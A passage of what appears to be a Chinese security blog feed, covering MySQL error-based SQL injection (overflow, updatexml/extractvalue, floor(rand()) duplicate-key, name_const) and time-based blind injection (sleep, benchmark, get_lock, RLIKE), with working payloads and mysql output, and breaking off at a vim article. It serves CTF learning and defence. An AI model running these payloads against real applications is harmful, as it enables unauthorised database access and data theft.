<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select ~0;</span></span><br><span class="line">+----------------------+</span><br><span class="line">| ~0                   |</span><br><span class="line">+----------------------+</span><br><span class="line">| 18446744073709551615 |</span><br><span class="line">+----------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select ~0+1;</span></span><br><span class="line">ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in &#x27;(~(0) + 1)&#x27;</span><br></pre></td></tr></table></figure>

<p>我们知道，如果一个查询成功返回，则其返回值为0，进行逻辑非运算后可得1，这个值是可以进行数学运算的：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select (select * from (select user())x);</span></span><br><span class="line">+----------------------------------+</span><br><span class="line">| (select * from (select user())x) |</span><br><span class="line">+----------------------------------+</span><br><span class="line">| root@localhost                   |</span><br><span class="line">+----------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select !(select * from (select user())x);</span></span><br><span class="line">+-----------------------------------+</span><br><span class="line">| !(select * from (select user())x) |</span><br><span class="line">+-----------------------------------+</span><br><span class="line">|                                 1 |</span><br><span class="line">+-----------------------------------+</span><br><span class="line">1 row in set (0.01 sec)</span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select !(select * from (select user())x)+1;</span></span><br><span class="line">+-------------------------------------+</span><br><span class="line">| !(select * from (select user())x)+1 |</span><br><span class="line">+-------------------------------------+</span><br><span class="line">|                                   2 |</span><br><span class="line">+-------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<p>同理，利用exp函数也会产生类似的溢出错误：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select exp(709);</span></span><br><span class="line">+-----------------------+</span><br><span class="line">| exp(709)              |</span><br><span class="line">+-----------------------+</span><br><span class="line">| 8.218407461554972e307 |</span><br><span class="line">+-----------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select exp(710);</span></span><br><span class="line">ERROR 1690 (22003): DOUBLE value is out of range in &#x27;exp(710)&#x27;</span><br></pre></td></tr></table></figure>

<p>注入姿势：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select exp(~(select*from(select user())x));</span></span><br><span class="line">ERROR 1690 (22003): DOUBLE value is out of range in &#x27;exp(~((select &#x27;root@localhost&#x27; from dual)))&#x27;</span><br></pre></td></tr></table></figure>

<p>利用这一特性，再结合之前说的溢出报错，就可以进行注入了。这里需要说一下，经笔者测试，发现在mysql5.5.47可以在报错中返回查询结果：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select (select(!x-~0)from(select(select user())x)a);</span></span><br><span class="line">ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in &#x27;((not(&#x27;root@localhost&#x27;)) - ~(0))&#x27;</span><br></pre></td></tr></table></figure>

<p>而在mysql&gt;5.5.53时，则不能返回查询结果</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select (select(!x-~0)from(select(select user())x)a);</span></span><br><span class="line">ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in &#x27;((not(`a`.`x`)) - ~(0))&#x27;</span><br></pre></td></tr></table></figure>

<p>此外，报错信息是有长度限制的，在mysql/my_error.c中可以看到：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/* Max length of a error message. Should be</span><br><span class="line">kept in sync with MYSQL_ERRMSG_SIZE. */</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">define ERRMSGSIZE (512)</span></span><br></pre></td></tr></table></figure>

<h2 id="2-xpath语法错误"><a href="#2-xpath语法错误" class="headerlink" title="2. xpath语法错误"></a>2. xpath语法错误</h2><p>从mysql5.1.5开始提供两个<a href="https://dev.mysql.com/doc/refman/5.7/en/xml-functions.html">XML查询和修改的函数</a>，extractvalue和updatexml。extractvalue负责在xml文档中按照xpath语法查询节点内容，updatexml则负责修改查询到的内容:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select extractvalue(1,<span class="string">&#x27;/a/b&#x27;</span>);</span></span><br><span class="line">+------------------------+</span><br><span class="line">| extractvalue(1,&#x27;/a/b&#x27;) |</span><br><span class="line">+------------------------+</span><br><span class="line">|                        |</span><br><span class="line">+------------------------+</span><br><span class="line">1 row in set (0.01 sec)</span><br></pre></td></tr></table></figure>

<p>它们的第二个参数都要求是符合xpath语法的字符串，如果不满足要求，则会报错，并且将查询结果放在报错信息里：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select updatexml(1,concat(0x7e,(select @@version),0x7e),1);</span></span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#x27;~5.7.17~&#x27;</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select extractvalue(1,concat(0x7e,(select @@version),0x7e));</span></span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#x27;~5.7.17~&#x27;</span><br></pre></td></tr></table></figure>

<h2 id="3-主键重复"><a href="#3-主键重复" class="headerlink" title="3. 主键重复"></a>3. 主键重复</h2><blockquote>
<p>相关函数</p>
<ul>
<li>rand()：产生一个 0~1 的随机数</li>
<li>floor()：向下取整</li>
<li>floor(rand(0)*2))：原本 floor(rand(0)) 得到固定的0，但乘以2 后得到的就是不固定的 0 或者 1</li>
</ul>
</blockquote>
<p>这里利用到了count()和group by在遇到rand()产生的重复值时报错的思路。网上比较常见的payload是这样的：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select count(*) from <span class="built_in">test</span> group by concat(version(),floor(rand(0)*2));</span></span><br><span class="line">ERROR 1062 (23000): Duplicate entry &#x27;5.7.171&#x27; for key &#x27;&lt;group_key&gt;&#x27;</span><br></pre></td></tr></table></figure>
<p>可以看到错误类型是duplicate entry，即主键重复。实际上只要是count，rand()，group by三个连用就会造成这种报错，与位置无关：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x;</span></span><br><span class="line">ERROR 1062 (23000): Duplicate entry &#x27;5.7.171&#x27; for key &#x27;&lt;group_key&gt;&#x27;</span><br></pre></td></tr></table></figure>

<p>这种报错方法的本质是因为floor(rand(0)*2)的重复性，导致group by语句出错。group by key的原理是循环读取数据的每一行，将结果保存于临时表中。读取每一行的key时，如果key存在于临时表中，则不在临时表中更新临时表的数据；如果key不在临时表中，则在临时表中插入key所在行的数据。举个例子，表中数据如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select * from <span class="built_in">test</span>;</span></span><br><span class="line">+------+-------+</span><br><span class="line">| id   | name  |</span><br><span class="line">+------+-------+</span><br><span class="line">| 0    | jack  |</span><br><span class="line">| 1    | jack  |</span><br><span class="line">| 2    | tom   |</span><br><span class="line">| 3    | candy |</span><br><span class="line">| 4    | tommy |</span><br><span class="line">| 5    | jerry |</span><br><span class="line">+------+-------+</span><br><span class="line">6 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
<p>我们以<code>select count(*) from test group by name</code>语句说明大致过程如下：</p>
<ul>
<li><p>先是建立虚拟表，其中key为主键，不可重复：</p>
<table>
<thead>
<tr>
<th>key</th>
<th>count(*)</th>
</tr>
</thead>
</table>
</li>
<li><p>开始查询数据，去数据库数据，然后查看虚拟表是否存在，不存在则插入新记录，存在则count(*)字段直接加1:</p>
<table>
<thead>
<tr>
<th>key</th>
<th>count(*)</th>
</tr>
</thead>
<tbody><tr>
<td>jack</td>
<td>1</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>key</th>
<th>count(*)</th>
</tr>
</thead>
<tbody><tr>
<td>jack</td>
<td>1+1</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>key</th>
<th>count(*)</th>
</tr>
</thead>
<tbody><tr>
<td>jack</td>
<td>1+1</td>
</tr>
<tr>
<td>tom</td>
<td>1</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>key</th>
<th>count(*)</th>
</tr>
</thead>
<tbody><tr>
<td>jack</td>
<td>1+1</td>
</tr>
<tr>
<td>tom</td>
<td>1</td>
</tr>
<tr>
<td>candy</td>
<td>1</td>
</tr>
</tbody></table>
</li>
</ul>
<p>当这个操作遇到 rand(0)*2 时，就会发生错误，其原因在于rand()函数使用了随机种子 0，得到的是一个稳定的序列，也就是说每次以0作为随机种子得到的序列是一样的。</p>
<p>同理，floor(rand(0)*2)则会固定得到序列(这个很重要)，假设我们得到的序列是 011011..</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select floor(rand(0)*2) from <span class="built_in">test</span>;</span></span><br><span class="line">+------------------+</span><br><span class="line">| floor(rand(0)*2) |</span><br><span class="line">+------------------+</span><br><span class="line">|                0 |</span><br><span class="line">|                1 |</span><br><span class="line">|                1 |</span><br><span class="line">|                0 |</span><br><span class="line">|                1 |</span><br><span class="line">|                1 |</span><br><span class="line">+------------------+</span><br><span class="line">6 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<p>回到之前的group by语句上，我们将其改为<code>select count(*) from test group by floor(rand(0)*2)</code>，看看每一步是什么情况：</p>
<ul>
<li>语句执行的时候建立一个虚拟表，整个工作流程大致如下：开始查询数据时，读取数据库数据，查看虚拟表中是否存在，不存在则插入新纪录，存在则 count(*) 直接加 1。 假设 floor(rand(0)*2) 得到的固定序列是 011011…</li>
<li>先创建一个虚拟表<table>
<thead>
<tr>
<th>key</th>
<th>count(*)</th>
</tr>
</thead>
</table>
</li>
<li>取第一条记录，执行 floor(rand(0)*2)，发现结果为0（第一次计算），查询虚拟表，发现 0 的键值不存在，则 floor(rand(0)*2) 会被再会计算一次，结果为1（第二次计算），插入虚表<table>
<thead>
<tr>
<th>key</th>
<th>count(*)</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>1</td>
</tr>
</tbody></table>
</li>
<li>查第二条记录，再次计算 floor(rand(0)<em>2)，发现结果为1(第三次计算)，查询虚表，发现键值 1 存在，所以此时不在计算第二次，直接count(</em>)值加1，如下：<table>
<thead>
<tr>
<th>key</th>
<th>count(*)</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>2(1+1)</td>
</tr>
</tbody></table>
</li>
<li>查第三条记录，再次计算floor(rand(0)*2)，发现结果为0(第四次计算)，发现键值没有0，则尝试插入记录，此时会又一次计算floor(rand(0)*2)，结果1(第5次计算)当作虚表的主键，而此时1这个主键已经存在于虚表中了，所以在插入的时候就会报主键重复的错误了。</li>
<li>最终报错的结果，即主键’1’重复：<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select count(*) from <span class="built_in">test</span> group by floor(rand(0)*2);</span></span><br><span class="line">ERROR 1062 (23000): Duplicate entry &#x27;1&#x27; for key &#x27;&lt;group_key&gt;&#x27;</span><br></pre></td></tr></table></figure></li>
</ul>
<p>整个查询过程中，floor(rand(0)*2)被计算了5次，查询原始数据表3次，所以表中需要至少3条数据才能报错。关于这个rand()的问题，官方文档在这里有个说明：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">RAND() in a WHERE clause is evaluated for every row (when selecting from one table) or combination of rows (when selecting from a multiple-table join). Thus, for optimizer purposes, RAND() is not a constant value and cannot be used for index optimizations.</span><br></pre></td></tr></table></figure>

<p>如果有一个序列开头时 0,1,0,0 或者 1,0,1,1 则无论如何都不会报错了，因为虚表开头两个主键会分别是 0 和 1，后面的就直接count(*)加1了</p>
<h2 id="4-一些特性"><a href="#4-一些特性" class="headerlink" title="4. 一些特性"></a>4. 一些特性</h2><h3 id="4-1-列名重复"><a href="#4-1-列名重复" class="headerlink" title="4.1 列名重复"></a>4.1 列名重复</h3><p>mysql列名重复会报错，我们利用name_const来制造一个列：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x;</span></span><br><span class="line">ERROR 1060 (42S21): Duplicate column name &#x27;5.7.17&#x27;</span><br></pre></td></tr></table></figure>

<p>根据<a href="https://dev.mysql.com/doc/refman/5.7/en/miscellaneous-functions.html#function_name-const">官方文档</a>，name_const函数要求参数必须是常量，所以实际使用上还没找到什么比较好的利用方式。</p>
<p>利用这个特性加上join函数可以爆列名：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select *  from(select * from <span class="built_in">test</span> a join <span class="built_in">test</span> b)c;</span></span><br><span class="line">ERROR 1060 (42S21): Duplicate column name &#x27;id&#x27;</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select *  from(select * from <span class="built_in">test</span> a join <span class="built_in">test</span> b using(id))c;</span></span><br><span class="line">ERROR 1060 (42S21): Duplicate column name &#x27;name&#x27;</span><br></pre></td></tr></table></figure>

<h3 id="4-2-几何函数"><a href="#4-2-几何函数" class="headerlink" title="4.2 几何函数"></a>4.2 几何函数</h3><p>mysql有些几何函数，例如geometrycollection()，multipoint()，polygon()，multipolygon()，linestring()，multilinestring()，这些函数对参数要求是形如(1 2,3 3,2 2 1)这样几何数据，如果不满足要求，则会报错。经测试，在版本号为5.5.47上可以用来注入，而在5.7.17上则不行：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">5.5.47</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select multipoint((select * from (select * from (select version())a)b));</span></span><br><span class="line">ERROR 1367 (22007): Illegal non geometric &#x27;(select `b`.`version()` from ((select &#x27;5.5.47&#x27; AS `version()` from dual) `b`))&#x27; value found during parsing</span><br><span class="line">5.7.17</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select multipoint((select * from (select * from (select version())a)b));</span></span><br><span class="line">ERROR 1367 (22007): Illegal non geometric &#x27;(select `a`.`version()` from ((select version() AS `version()`) `a`))&#x27; value found during parsing</span><br></pre></td></tr></table></figure>

<p>————————————————<br>本文主要参考<a href="https://xz.aliyun.com/">先知社区</a> 的文章 <a href="https://xz.aliyun.com/t/253">MYSQL报错注入的一点总结</a>，仅作些许修改。</p>
]]></content>
      <categories>
        <category>网络安全</category>
        <category>CTF</category>
        <category>Web 安全</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>Web 安全</tag>
      </tags>
  </entry>
  <entry>
    <title>基于时间的盲注</title>
    <url>/%E5%9F%BA%E4%BA%8E%E6%97%B6%E9%97%B4%E7%9A%84%E7%9B%B2%E6%B3%A8/</url>
    <content><![CDATA[<p>时间盲注详解</p>
<span id="more"></span>

<h2 id="1-基础知识"><a href="#1-基础知识" class="headerlink" title="1. 基础知识"></a>1. 基础知识</h2><p>时间盲注指通过页面执行的时间来判断数据内容的注入方式，通常用于数据（包含逻辑型）不能返回到页面中的场景，无法利用页面回显判断数据内容，只能通过执行的时间来获取数据。</p>
<p>在执行语句的过程中，由于 sleep(duration) 函数的存在，保证是注入导致的延时，而不是业务正常处理导致的延时。</p>
<h2 id="2-原理演示"><a href="#2-原理演示" class="headerlink" title="2. 原理演示"></a>2. 原理演示</h2><h3 id="2-1-sleep-函数"><a href="#2-1-sleep-函数" class="headerlink" title="2.1 sleep 函数"></a>2.1 sleep 函数</h3><ul>
<li>sleep(duration)<ul>
<li>睡眠时间为 duration 参数给定的秒数，然后返回0；若函数被中断，返回1。</li>
</ul>
</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select * from user;</span></span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | admin    | 12345678 |</span><br><span class="line">|  2 | admin1   | aaaa     |</span><br><span class="line">|  3 | admin2   | aaaa     |</span><br><span class="line">|  4 | admin3   | aaaa     |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">4 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select sleep(3);</span></span><br><span class="line">+----------------------+</span><br><span class="line">| sleep(3)             |</span><br><span class="line">+----------------------+</span><br><span class="line">| 0                    |</span><br><span class="line">+----------------------+</span><br><span class="line">1 row in set (3.00 sec)</span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select * from user <span class="built_in">where</span> id = 1 and sleep(3);</span></span><br><span class="line">Empty set (3.01 sec)</span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select * from user <span class="built_in">where</span> id = 5 and sleep(3);</span></span><br><span class="line">Empty set (0.00 sec)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>sleep(3) 执行完成后返回 0，所以 <code>select * from user where id = 1 and sleep(3)</code>查询 0 条数据</p>
<p>and 的逻辑是如果 and 左侧表达式为假，则直接返回假，不再直接右侧表达式。所以当 id=5 查不到数据时，直接就会返回结果，这样就可以用布尔注入逻辑，根据执行的时长，来测试是否查到数据。</p>
<p>如果 and 逻辑换成 or，又会有变化。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select * from user <span class="built_in">where</span> id = 1 or sleep(3);</span></span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | admin    | 12345678 |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">1 row in set (9.01sec)</span><br></pre></td></tr></table></figure>
<p>or 逻辑是左侧若为真则不判断右侧表达式，所以 id=1 这条执行了 0.01 sec，接下来 id=2,3,4 这几条数据都会执行 sleep(3)，总共是 9.01sec。（可能不是所有版本都是这样的逻辑）</p>
<h3 id="2-2-配合-if-条件触发"><a href="#2-2-配合-if-条件触发" class="headerlink" title="2.2 配合 if  条件触发"></a>2.2 配合 if  条件触发</h3><ul>
<li>if(expr1, expr2, expr3)<ul>
<li>如果 expr1 是 True，则返回 expr2，否则返回 expr3</li>
<li>返回值是数字值或字符串值<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select * from user <span class="built_in">where</span> id = 5 or <span class="keyword">if</span>(username = <span class="string">&#x27;admin&#x27;</span>, 1, 0);</span></span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | admin    | 12345678 |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">1 row in set (9.01sec)</span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select * from user <span class="built_in">where</span> id = 1 and <span class="keyword">if</span>(database()=<span class="string">&#x27; &#x27;</span>, sleep(4), null);</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h3 id="2-3-截取函数"><a href="#2-3-截取函数" class="headerlink" title="2.3 截取函数"></a>2.3 截取函数</h3><p>配合截取函数，能够判断猜测的某一位数据是否准确</p>
<p>单个字母爆破</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select * from user <span class="built_in">where</span> username=<span class="string">&#x27;a&#x27;</span> or <span class="keyword">if</span>(substr((select username from user <span class="built_in">where</span> id = 1), 1, 1) = <span class="string">&#x27;a&#x27;</span> , sleep(3), 0)</span>  </span><br></pre></td></tr></table></figure>
<ul>
<li>substring<ul>
<li>substring(str, pos)</li>
<li>substring(str FROM pos)</li>
<li>substring(str, pos, len)</li>
<li>substring(str FROM pos FOR len)</li>
</ul>
</li>
<li>substr(str, start, length)</li>
<li>mid(str, start, length)<ul>
<li>str，必需</li>
<li>start，必需</li>
<li>length，可选</li>
</ul>
</li>
<li>substring_index(str, delim, count) <ul>
<li>str：被截取字符串</li>
<li>delim：关键字</li>
<li>count：关键字出现的次数 </li>
</ul>
</li>
</ul>
<p>实际上，使用正则表达式也能达到类似的效果,“^”表示从头开始匹配</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select * from user <span class="built_in">where</span> password rlike = <span class="string">&#x27;^1&#x27;</span>;</span></span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | admin    | 12345678 |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">1 row in set (0.00sec)</span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select * from user <span class="built_in">where</span> password regexp <span class="string">&#x27;^12&#x27;</span>;</span></span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | admin    | 12345678 |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">1 row in set (0.00sec)</span><br></pre></td></tr></table></figure>

<p>我们注意到，进行匹配时传入单个字符都需要引号，如果想不传入引号达到一样的效果，可以使用 ascii() 函数</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">and</span> (if(substr(database(),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27; &#x27;</span>,sleep(<span class="number">4</span>),<span class="keyword">null</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">and</span> (if(ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">100</span>,sleep(<span class="number">4</span>),<span class="keyword">null</span>))</span><br></pre></td></tr></table></figure>

<h3 id="2-4-配合-select-case-when-条件触发"><a href="#2-4-配合-select-case-when-条件触发" class="headerlink" title="2.4 配合 select case when 条件触发"></a>2.4 配合 select case when 条件触发</h3><p>SQL CASE 表达式是一种通用的条件表达式，类似于其他语言中的  if…else… 语句</p>
<blockquote>
<p>CASE WHEN condition THEN result<br>[WHEN …]<br>[ELSE result]<br>END</p>
</blockquote>
<p>先来一个使用举例：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select <span class="keyword">case</span> when username = <span class="string">&#x27;admin&#x27;</span> THEN <span class="string">&#x27;aaa&#x27;</span> ELSE <span class="string">&#x27;xxxx&#x27;</span> end from user;</span></span><br><span class="line">+---------------------------------------------------------+</span><br><span class="line">| case when username = &#x27;admin&#x27; THEN &#x27;aaa&#x27; ELSE &#x27;xxxx&#x27; end |</span><br><span class="line">+---------------------------------------------------------+</span><br><span class="line">|  aaa                                                    |</span><br><span class="line">|  xxxx                                                   |</span><br><span class="line">|  xxxx                                                   |</span><br><span class="line">|  xxxx                                                   |</span><br><span class="line">+---------------------------------------------------------+</span><br><span class="line">4 row in set (0.00sec)</span><br></pre></td></tr></table></figure>
<p>可以与 sleep 或者其他形式结合</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="keyword">case</span> <span class="keyword">when</span> username <span class="operator">=</span> <span class="string">&#x27;admin&#x27;</span> <span class="keyword">THEN</span> (sleep(<span class="number">3</span>)) <span class="keyword">ELSE</span> <span class="string">&#x27;xxxx&#x27;</span> <span class="keyword">end</span> <span class="keyword">from</span> <span class="keyword">user</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">case</span> <span class="keyword">when</span> username <span class="operator">=</span> <span class="string">&#x27;admin&#x27;</span> <span class="keyword">THEN</span> <span class="string">&#x27;aaa&#x27;</span> <span class="keyword">ELSE</span> <span class="string">&#x27;xxxx&#x27;</span> <span class="keyword">end</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">0</span>                                                      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  xxxx                                                   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  xxxx                                                   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  xxxx                                                   <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------------------------------------------+</span></span><br><span class="line"><span class="number">4</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">3.01</span>sec)</span><br></pre></td></tr></table></figure>

<h3 id="2-5-除-sleep-之外的延时"><a href="#2-5-除-sleep-之外的延时" class="headerlink" title="2.5 除 sleep 之外的延时"></a>2.5 除 sleep 之外的延时</h3><ul>
<li><p>BENCHMARK(count, expr)</p>
<ul>
<li>重复 count 次执行表达式 expr。</li>
<li>可以被用于计算 MySQL 处理表达式的速度</li>
<li>结果值通常为0</li>
</ul>
</li>
<li><p>笛卡尔积</p>
<ul>
<li>SELECT count(*) FROM information_schema.columns A, information_schema.colums B, information_schema.colums C;</li>
<li>通过复杂的运算达到延时</li>
</ul>
</li>
<li><p>GET_LOCK(str, timeout)</p>
<ul>
<li>使用字符串 str 给定的名字得到一个锁，超时为 timeout 秒</li>
<li>局限：当前会话不会生效，只有新会话开启，并且保持长连接（ mysql_pconnect函数来连接数据库），才能生效<br>session 1<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select get_lock(<span class="string">&#x27;karma&#x27;</span>,1);</span></span><br><span class="line">+---------------------+</span><br><span class="line">| get_lock(&#x27;karma&#x27;,1) |</span><br><span class="line">+---------------------+</span><br><span class="line">|                   1 |</span><br><span class="line">+---------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
session 2<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select get_lock(<span class="string">&#x27;karma&#x27;</span>,10);</span></span><br><span class="line">+----------------------+</span><br><span class="line">| get_lock(&#x27;karma&#x27;,10) |</span><br><span class="line">+----------------------+</span><br><span class="line">|                    0 |</span><br><span class="line">+----------------------+</span><br><span class="line">1 row in set (10.00 sec)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>RLIKE</p>
<ul>
<li>通过 rpad 或 repeat 构造长字符串，加以计算量打的 pattern，通过 repeat 的参数可以控制延时长短<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select concat (rpad(1,999999,<span class="string">&#x27;a&#x27;</span>),rpad(1,999999,<span class="string">&#x27;a&#x27;</span>),rpad(1,999999,<span class="string">&#x27;a&#x27;</span>),rpad(1,999999,<span class="string">&#x27;a&#x27;</span>),rpad(1,999999,<span class="string">&#x27;a&#x27;</span>),rpad(1,999999,<span class="string">&#x27;a&#x27;</span>),rpad(1,999999,<span class="string">&#x27;a&#x27;</span>),rpad(1,999999,<span class="string">&#x27;a&#x27;</span>),rpad(1,999999,<span class="string">&#x27;a&#x27;</span>),rpad(1,999999,<span class="string">&#x27;a&#x27;</span>),rpad(1,999999,<span class="string">&#x27;a&#x27;</span>),rpad(1,999999,<span class="string">&#x27;a&#x27;</span>),rpad(1,999999,<span class="string">&#x27;a&#x27;</span>),rpad(1,999999,<span class="string">&#x27;a&#x27;</span>),rpad(1,999999,<span class="string">&#x27;a&#x27;</span>),rpad(1,999999,<span class="string">&#x27;a&#x27;</span>)) RLIKE <span class="string">&#x27;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b&#x27;</span></span></span><br><span class="line"></span><br><span class="line">*****</span><br><span class="line">1 row in set (0.51 sec)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<p>————————————————</p>
<ul>
<li><a href="https://www.freebuf.com/articles/web/175049.html">浅谈SQL盲注测试方法解析与技巧</a></li>
<li><a href="https://www.php.cn/mysql-tutorials-417450.html">MySQL中RLIKE运算符的使用详解</a></li>
<li><a href="https://www.jianshu.com/p/0d607589e3ad">Mysql时间盲注手工注入详解</a></li>
</ul>
]]></content>
      <categories>
        <category>网络安全</category>
        <category>CTF</category>
        <category>Web 安全</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>Web 安全</tag>
      </tags>
  </entry>
  <entry>
    <title>vim 编辑器</title>
    <url>/vim/</url>
    <content><![CDATA[<p>介绍 linux 编辑器 vim</p>
<span id="more"></span>

<h2 id="1-vim-的介绍"><a href="#1-vim-的介绍" class="headerlink" title="1. vim 的介绍"></a>1. vim 的介绍</h2><p>vim 是一款功能强大的文本编辑器，也是早年 Vi 编辑器的加强版，它的最大特色就是使用命令进行编辑，完全脱离了鼠标的操作。</p>
